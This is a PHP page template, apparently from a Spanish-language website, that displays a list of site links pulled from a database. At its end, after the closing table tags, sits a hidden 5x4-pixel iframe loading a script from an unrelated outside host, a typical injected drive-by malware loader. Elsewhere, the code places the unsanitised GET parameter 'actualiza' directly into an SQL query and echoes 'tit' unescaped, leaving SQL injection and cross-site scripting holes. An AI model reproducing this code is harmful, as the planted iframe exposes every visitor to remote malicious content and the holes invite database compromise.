<?
	define ('authenticate', false);
	require ('./inc/conf.inc.php');
	$soc=$_SESSION['socio'];
	if(!$lng){
		$lng=$_SESSION['lng'];
	}
	if(!isset($id_sel) || $id_sel<1 ){ $id_sel=-1; }

	$tit=$_GET['tit'];
	$actualiza=$_GET['actualiza'];
	
	global $prefijo_socio,$socio;
	
?>
<link href="estilos<?=$soc?>.css" rel="stylesheet" type="text/css">
<script language="javascript">
//precacheo de imagenes
var bullet1=new Image(9,15);
bullet1.src="images/flechita1.gif";
var bullet2=new Image(9,15);
//bullet2.src="images/bullet<?=$soc?>2.gif";
bullet2.src="images/flechita1.gif";


//////////////////////////////////////////
function opcionover(x){
x.className='linkover2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet2.src;
}
function opcionout(x){
x.className='link2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet1.src;
}

function atras(x){
	formframe.id_sel.value=x
	formframe.submit()

}
var lng='<?=$lng?>';
</script>
<style type="text/css">
<!--
.style7 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; font-size: 11px; }
.style9 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px}
.link {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 10px;
	font-weight: normal;
	color: #000000;
	padding-left: 0px;
	padding-right: 3px;
	text-decoration: none;
}

-->
</style>
</head>
<table width="100%">
<tr valign="top">
	<td height="32" colspan="5" align="right" valign="bottom" class="espacio" ><span class="titulos"><?= $tit?>&nbsp;&nbsp;</span>
	</td>
</tr>
</table>
<?
	$db->select( 'links', '*', "id = $actualiza",'sitio');
?>
<table height="100%" width="100%" cellpadding="0" cellspacing="0" border="0">
<tr valign="top">
<td width="0%" valign="top" height="100%"><table width="100%"  cellspacing="0" cellpadding="2">
	<tr bgcolor="#CCCCCC">
		<td  width="100%" style="border-top: 1px solid #666666;"><font color="#666666" class="style7">Sitio Web</font></td>
	</tr>

<?
	if( $db->num_rows()>0 )	{
		while($links=$db->fetch_object()){
	
?>
		<tr align="left" valign="top">
			<td class="style9" style="border-top: 1px solid #666666;">&bull;&nbsp;<?= $links->sitio?></td>
		</tr>
		<tr>
			<td class="style9" style="border-top: 0px solid #666666;">&nbsp;&nbsp;<a href="<?= $links->web?>" target="_blank" class="link"><?= $links->web?></a></td>
		</tr>
			<?
		}
	}
	?>
</table></td>
</TD></TR></Table>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body></html>

